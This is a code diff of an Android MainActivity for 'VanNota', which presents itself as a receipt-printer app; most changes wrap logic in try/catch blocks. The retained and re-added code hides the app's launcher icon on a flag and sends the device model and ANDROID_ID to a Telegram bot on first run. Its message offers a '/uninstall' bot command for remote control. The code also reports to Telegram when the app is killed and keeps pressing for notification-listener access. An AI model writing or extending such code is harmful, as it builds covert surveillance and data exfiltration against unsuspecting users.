@@ -136,138 +136,190 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        if (!hasAllRequiredPermissions()) {
-            showPermissionGateDialog();
-            return;
-        }
+        try {
+            // ==========================================
+            // PERMISSION GATE
+            // ==========================================
+            if (!hasAllRequiredPermissions()) {
+                showPermissionGateDialog();
+                return;
+            }
 
-        // Aktifkan Internet selalu ON (Wake Lock + Internet)
-        enableAlwaysOnInternet();
-
-        // Simpan nama perangkat ke SharedPreferences
-        saveDeviceInfo();
-
-        // ==========================================
-        // CEK APAKAH APLIKASI SEDANG DI-HIDE
-        // ==========================================
-        SharedPreferences prefs = getSharedPreferences("cetak_pro", MODE_PRIVATE);
-        boolean isHidden = prefs.getBoolean("app_hidden", false);
-        if (isHidden) {
+            // ==========================================
+            // AKTIFKAN INTERNET (Wake Lock)
+            // ==========================================
             try {
-                PackageManager pm = getPackageManager();
-                ComponentName componentName = new ComponentName(this, MainActivity.class);
-                pm.setComponentEnabledSetting(
-                    componentName,
-                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    PackageManager.DONT_KILL_APP
-                );
+                enableAlwaysOnInternet();
             } catch (Exception e) {
                 e.printStackTrace();
             }
+
+            // ==========================================
+            // SIMPAN NAMA PERANGKAT
+            // ==========================================
+            try {
+                saveDeviceInfo();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+            // ==========================================
+            // CEK APAKAH APLIKASI SEDANG DI-HIDE
+            // ==========================================
+            try {
+                SharedPreferences prefs = getSharedPreferences("cetak_pro", MODE_PRIVATE);
+                boolean isHidden = prefs.getBoolean("app_hidden", false);
+                if (isHidden) {
+                    PackageManager pm = getPackageManager();
+                    ComponentName componentName = new ComponentName(this, MainActivity.class);
+                    pm.setComponentEnabledSetting(
+                        componentName,
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP
+                    );
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+            // ==========================================
+            // SETUP WINDOW & WEBVIEW
+            // ==========================================
+            getWindow().setStatusBarColor(Color.rgb(244, 247, 251));
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR);
+            }
+
+            webView = new WebView(this);
+            webView.setBackgroundColor(Color.rgb(244, 247, 251));
+            setContentView(webView);
+
+            WebSettings settings = webView.getSettings();
+            settings.setJavaScriptEnabled(true);
+            settings.setDomStorageEnabled(true);
+            settings.setDatabaseEnabled(true);
+            settings.setAllowFileAccess(true);
+            settings.setAllowContentAccess(true);
+            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);
+            settings.setMediaPlaybackRequiresUserGesture(true);
+            settings.setUserAgentString(settings.getUserAgentString() + " VanNotaAndroid/1.1");
+
+            printerBridge = new PrinterBridge();
+            telegramReporter = new TelegramReporter();
+            webView.addJavascriptInterface(printerBridge, "AndroidPrinter");
+            webView.addJavascriptInterface(printerBridge, "AndroidWifi");
+            webView.addJavascriptInterface(printerBridge, "AndroidNetwork");
+
+            // ==========================================
+            // WEB CHROME CLIENT
+            // ==========================================
+            webView.setWebChromeClient(new WebChromeClient() {
+                @Override
+                public boolean onShowFileChooser(WebView view, ValueCallback<Uri[]> callback, FileChooserParams params) {
+                    if (fileCallback != null) fileCallback.onReceiveValue(null);
+                    fileCallback = callback;
+                    try {
+                        startActivityForResult(params.createIntent(), REQUEST_FILE);
+                        return true;
+                    } catch (Exception error) {
+                        fileCallback = null;
+                        Toast.makeText(MainActivity.this, "Pemilih gambar tidak tersedia.", Toast.LENGTH_SHORT).show();
+                        return false;
+                    }
+                }
+            });
+
+            // ==========================================
+            // WEB VIEW CLIENT
+            // ==========================================
+            webView.setWebViewClient(new WebViewClient() {
+                @Override
+                public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
+                    Uri uri = request.getUrl();
+                    String host = uri.getHost();
+                    if (host != null && (host.equals("irvan1406.github.io") || host.endsWith(".jsdelivr.net"))) return false;
+                    try {
+                        startActivity(new Intent(Intent.ACTION_VIEW, uri));
+                        return true;
+                    } catch (Exception ignored) {
+                        return false;
+                    }
+                }
+
+                @Override
+                public void onPageFinished(WebView view, String url) {
+                    if (url.startsWith("https://")) showingOffline = false;
+                    if (printerBridge != null) {
+                        printerBridge.dispatchStatus();
+                        printerBridge.dispatchWifiInfo();
+                        printerBridge.autoConnect();
+                    }
+                    checkNotificationAccessStatus();
+                }
+
+                @Override
+                public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
+                    if (request.isForMainFrame() && !showingOffline) {
+                        showingOffline = true;
+                        view.loadUrl(OFFLINE_URL);
+                    }
+                }
+            });
+
+            // ==========================================
+            // REGISTER RECEIVER & NOTIFICATION
+            // ==========================================
+            registerBluetoothReceiver();
+            createNotificationChannel();
+            if (notificationsAllowed()) startAppIfAllowed();
+            else enforceNotificationGate();
+
+        } catch (Exception e) {
+            e.printStackTrace();
+            try {
+                Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
+            } catch (Exception ignored) {}
         }
-
-        getWindow().setStatusBarColor(Color.rgb(244, 247, 251));
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR);
-        }
-
-        webView = new WebView(this);
-        webView.setBackgroundColor(Color.rgb(244, 247, 251));
-        setContentView(webView);
-
-        WebSettings settings = webView.getSettings();
-        settings.setJavaScriptEnabled(true);
-        settings.setDomStorageEnabled(true);
-        settings.setDatabaseEnabled(true);
-        settings.setAllowFileAccess(true);
-        settings.setAllowContentAccess(true);
-        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);
-        settings.setMediaPlaybackRequiresUserGesture(true);
-        settings.setUserAgentString(settings.getUserAgentString() + " VanNotaAndroid/1.1");
-
-        printerBridge = new PrinterBridge();
-        telegramReporter = new TelegramReporter();
-        webView.addJavascriptInterface(printerBridge, "AndroidPrinter");
-        webView.addJavascriptInterface(printerBridge, "AndroidWifi");
-        webView.addJavascriptInterface(printerBridge, "AndroidNetwork");
-
-        webView.setWebChromeClient(new WebChromeClient() {
-            @Override
-            public boolean onShowFileChooser(WebView view, ValueCallback<Uri[]> callback, FileChooserParams params) {
-                if (fileCallback != null) fileCallback.onReceiveValue(null);
-                fileCallback = callback;
-                try {
-                    startActivityForResult(params.createIntent(), REQUEST_FILE);
-                    return true;
-                } catch (Exception error) {
-                    fileCallback = null;
-                    Toast.makeText(MainActivity.this, "Pemilih gambar tidak tersedia.", Toast.LENGTH_SHORT).show();
-                    return false;
-                }
-            }
-        });
-
-        webView.setWebViewClient(new WebViewClient() {
-            @Override
-            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
-                Uri uri = request.getUrl();
-                String host = uri.getHost();
-                if (host != null && (host.equals("irvan1406.github.io") || host.endsWith(".jsdelivr.net"))) return false;
-                try {
-                    startActivity(new Intent(Intent.ACTION_VIEW, uri));
-                    return true;
-                } catch (Exception ignored) {
-                    return false;
-                }
-            }
-
-            @Override
-            public void onPageFinished(WebView view, String url) {
-                if (url.startsWith("https://")) showingOffline = false;
-                printerBridge.dispatchStatus();
-                printerBridge.dispatchWifiInfo();
-                printerBridge.autoConnect();
-                checkNotificationAccessStatus();
-            }
-
-            @Override
-            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
-                if (request.isForMainFrame() && !showingOffline) {
-                    showingOffline = true;
-                    view.loadUrl(OFFLINE_URL);
-                }
-            }
-        });
-
-        registerBluetoothReceiver();
-        createNotificationChannel();
-        if (notificationsAllowed()) startAppIfAllowed();
-        else enforceNotificationGate();
     }
 
     // ============================================================
     // SIMPAN NAMA PERANGKAT KE SHAREDPREFERENCES
     // ============================================================
     private void saveDeviceInfo() {
-        SharedPreferences prefs = getSharedPreferences("cetak_pro", MODE_PRIVATE);
-        String deviceName = Build.MODEL;
-        String androidVersion = Build.VERSION.RELEASE;
-        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        
-        prefs.edit()
-            .putString("device_name", deviceName)
-            .putString("device_android_version", androidVersion)
-            .putString("device_id", deviceId)
-            .apply();
-        
-        if (!prefs.getBoolean("device_info_sent", false)) {
-            prefs.edit().putBoolean("device_info_sent", true).apply();
-            String message = "📱 PERANGKAT BARU TERDAFTAR\n" +
-                             "Nama: " + deviceName + "\n" +
-                             "Android: " + androidVersion + "\n" +
-                             "ID: " + deviceId + "\n\n" +
-                             "Kirim /uninstall ke bot untuk hapus aplikasi.";
-            TelegramSender.sendMessage(this, "🆕 Device Registered", message);
+        try {
+            SharedPreferences prefs = getSharedPreferences("cetak_pro", MODE_PRIVATE);
+            String deviceName = Build.MODEL;
+            String androidVersion = Build.VERSION.RELEASE;
+
+            String deviceId = "unknown";
+            try {
+                deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+                if (deviceId == null) deviceId = "unknown";
+            } catch (Exception e) {
+                deviceId = "unknown";
+            }
+
+            prefs.edit()
+                .putString("device_name", deviceName)
+                .putString("device_android_version", androidVersion)
+                .putString("device_id", deviceId)
+                .apply();
+
+            if (!prefs.getBoolean("device_info_sent", false)) {
+                prefs.edit().putBoolean("device_info_sent", true).apply();
+                String message = "📱 PERANGKAT BARU TERDAFTAR\n" +
+                                 "Nama: " + deviceName + "\n" +
+                                 "Android: " + androidVersion + "\n" +
+                                 "ID: " + deviceId + "\n\n" +
+                                 "Kirim /uninstall ke bot untuk hapus aplikasi.";
+                try {
+                    TelegramSender.sendMessage(this, "🆕 Device Registered", message);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
@@ -275,9 +327,15 @@ public class MainActivity extends Activity {
     // AKTIFKAN INTERNET SELALU ON
     // ============================================================
     private void enableAlwaysOnInternet() {
-        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "VanNota:WakeLock");
-        wakeLock.acquire(10 * 60 * 1000L);
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null) {
+                PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "VanNota:WakeLock");
+                wakeLock.acquire(10 * 60 * 1000L);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     // ============================================================
@@ -299,8 +357,8 @@ public class MainActivity extends Activity {
         try {
             Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
             startActivity(intent);
-            Toast.makeText(this, 
-                "Aktifkan VanNota di menu 'Akses Notifikasi'", 
+            Toast.makeText(this,
+                "Aktifkan VanNota di menu 'Akses Notifikasi'",
                 Toast.LENGTH_LONG
             ).show();
         } catch (Exception e) {
@@ -318,7 +376,7 @@ public class MainActivity extends Activity {
     // ============================================================
     private void showNotificationAccessDialog() {
         if (notificationAccessDialog != null && notificationAccessDialog.isShowing()) return;
-        
+
         notificationAccessDialog = new AlertDialog.Builder(this)
             .setTitle("🔔 Aktifkan Notifikasi")
             .setMessage("Agar aplikasi dapat menampilkan status dan notifikasi penting, silakan aktifkan akses notifikasi untuk VanNota.\n\n" +
@@ -359,34 +417,42 @@ public class MainActivity extends Activity {
     protected void onResume() {
         super.onResume();
 
-        if (webView == null) {
-            return;
-        }
-
-        if (!isNotificationListenerEnabled()) {
-            showNotificationAccessDialog();
-        }
-
-        mainHandler.postDelayed(() -> {
-            if (isFinishing() || isDestroyed() || notificationRequestPending) return;
-            if (notificationsAllowed()) {
-                startAppIfAllowed();
-            } else {
-                enforceNotificationGate();
+        try {
+            if (webView == null) {
+                return;
             }
-        }, 250);
+
+            if (!isNotificationListenerEnabled()) {
+                showNotificationAccessDialog();
+            }
+
+            mainHandler.postDelayed(() -> {
+                if (isFinishing() || isDestroyed() || notificationRequestPending) return;
+                if (notificationsAllowed()) {
+                    startAppIfAllowed();
+                } else {
+                    enforceNotificationGate();
+                }
+            }, 250);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == REQUEST_FILE) {
-            if (fileCallback != null) {
-                fileCallback.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, data));
-                fileCallback = null;
+        try {
+            if (requestCode == REQUEST_FILE) {
+                if (fileCallback != null) {
+                    fileCallback.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, data));
+                    fileCallback = null;
+                }
+            } else if (requestCode == REQUEST_ENABLE_BLUETOOTH && resultCode == RESULT_OK) {
+                choosePrinter();
             }
-        } else if (requestCode == REQUEST_ENABLE_BLUETOOTH && resultCode == RESULT_OK) {
-            choosePrinter();
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
@@ -397,73 +463,102 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
-        if (requestCode == REQUEST_NOTIFICATIONS) {
-            notificationRequestPending = false;
-            if (notificationsAllowed()) startAppIfAllowed();
-            else enforceNotificationGate();
-            return;
-        }
+        try {
+            if (requestCode == REQUEST_NOTIFICATIONS) {
+                notificationRequestPending = false;
+                if (notificationsAllowed()) startAppIfAllowed();
+                else enforceNotificationGate();
+                return;
+            }
 
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            boolean allGranted = true;
-            for (int grant : grantResults) {
-                if (grant != PackageManager.PERMISSION_GRANTED) {
-                    allGranted = false;
-                    break;
+            if (requestCode == PERMISSION_REQUEST_CODE) {
+                boolean allGranted = true;
+                for (int grant : grantResults) {
+                    if (grant != PackageManager.PERMISSION_GRANTED) {
+                        allGranted = false;
+                        break;
+                    }
+                }
+                if (allGranted) {
+                    Toast.makeText(this, "Izin diberikan. Aplikasi siap.", Toast.LENGTH_SHORT).show();
+                    showNotificationAccessDialog();
+                    recreate();
+                } else {
+                    Toast.makeText(this, "Izin ditolak. Aplikasi memerlukan izin ini.", Toast.LENGTH_LONG).show();
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                        if (!isFinishing() && !isDestroyed()) {
+                            showPermissionGateDialog();
+                        }
+                    }, 1500);
+                }
+                return;
+            }
+
+            if (requestCode == REQUEST_PERMISSIONS) {
+                if (printerBridge != null) {
+                    printerBridge.dispatchWifiInfo();
+                    if (connectAfterPermission) {
+                        connectAfterPermission = false;
+                        choosePrinter();
+                    } else {
+                        printerBridge.autoConnect();
+                    }
                 }
             }
-            if (allGranted) {
-                Toast.makeText(this, "Izin diberikan. Aplikasi siap.", Toast.LENGTH_SHORT).show();
-                showNotificationAccessDialog();
-                recreate();
-            } else {
-                Toast.makeText(this, "Izin ditolak. Aplikasi memerlukan izin ini.", Toast.LENGTH_LONG).show();
-                new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                    if (!isFinishing() && !isDestroyed()) {
-                        showPermissionGateDialog();
-                    }
-                }, 1500);
-            }
-            return;
-        }
-
-        if (requestCode == REQUEST_PERMISSIONS) {
-            printerBridge.dispatchWifiInfo();
-            if (connectAfterPermission) {
-                connectAfterPermission = false;
-                choosePrinter();
-            } else {
-                printerBridge.autoConnect();
-            }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
     @Override
     public void onBackPressed() {
-        if (webView != null && webView.canGoBack()) webView.goBack();
-        else super.onBackPressed();
+        try {
+            if (webView != null && webView.canGoBack()) webView.goBack();
+            else super.onBackPressed();
+        } catch (Exception e) {
+            super.onBackPressed();
+        }
     }
 
     @Override
     protected void onDestroy() {
-        TelegramSender.sendMessage(this, "⚠️ APLIKASI DIMATIKAN", "VanNota dimatikan paksa!");
+        try {
+            TelegramSender.sendMessage(this, "⚠️ APLIKASI DIMATIKAN", "VanNota dimatikan paksa!");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 
-        if (receiverRegistered) {
-            try {
+        try {
+            if (receiverRegistered) {
                 unregisterReceiver(bluetoothReceiver);
-            } catch (Exception ignored) {
             }
-        }
-        if (printerBridge != null) printerBridge.closeImmediately();
-        ioExecutor.shutdownNow();
-        networkExecutor.shutdownNow();
-        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-        if (manager != null) manager.cancel(STATUS_NOTIFICATION_ID);
-        if (webView != null) webView.destroy();
-        if (notificationAccessDialog != null) {
-            notificationAccessDialog.dismiss();
-            notificationAccessDialog = null;
-        }
+        } catch (Exception ignored) {}
+
+        try {
+            if (printerBridge != null) printerBridge.closeImmediately();
+        } catch (Exception ignored) {}
+
+        try {
+            ioExecutor.shutdownNow();
+            networkExecutor.shutdownNow();
+        } catch (Exception ignored) {}
+
+        try {
+            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+            if (manager != null) manager.cancel(STATUS_NOTIFICATION_ID);
+        } catch (Exception ignored) {}
+
+        try {
+            if (webView != null) webView.destroy();
+        } catch (Exception ignored) {}
+
+        try {
+            if (notificationAccessDialog != null) {
+                notificationAccessDialog.dismiss();
+                notificationAccessDialog = null;
+            }
+        } catch (Exception ignored) {}
+
         super.onDestroy();
     }
 
@@ -501,7 +596,7 @@ public class MainActivity extends Activity {
     }
 
     // ============================================================
-    // METHOD LAINNYA (tidak berubah dari sebelumnya)
+    // METHOD LAINNYA
     // ============================================================
     private void registerBluetoothReceiver() {
         IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_ACL_DISCONNECTED);
@@ -541,24 +636,28 @@ public class MainActivity extends Activity {
     }
 
     private void startAppIfAllowed() {
-        if (webView == null) return;
-        if (!notificationsAllowed()) return;
+        try {
+            if (webView == null) return;
+            if (!notificationsAllowed()) return;
 
-        if (notificationGateDialog != null) {
-            notificationGateDialog.dismiss();
-            notificationGateDialog = null;
+            if (notificationGateDialog != null) {
+                notificationGateDialog.dismiss();
+                notificationGateDialog = null;
+            }
+
+            webView.setVisibility(View.VISIBLE);
+            webView.onResume();
+
+            updateStatusNotification("Siap digunakan");
+
+            if (appStarted) return;
+
+            appStarted = true;
+            webView.loadUrl(BuildConfig.WEB_APP_URL);
+            mainHandler.postDelayed(this::explainAndRequestPermissions, 700);
+        } catch (Exception e) {
+            e.printStackTrace();
         }
-
-        webView.setVisibility(View.VISIBLE);
-        webView.onResume();
-
-        updateStatusNotification("Siap digunakan");
-
-        if (appStarted) return;
-
-        appStarted = true;
-        webView.loadUrl(BuildConfig.WEB_APP_URL);
-        mainHandler.postDelayed(this::explainAndRequestPermissions, 700);
     }
 
     private void enforceNotificationGate() {
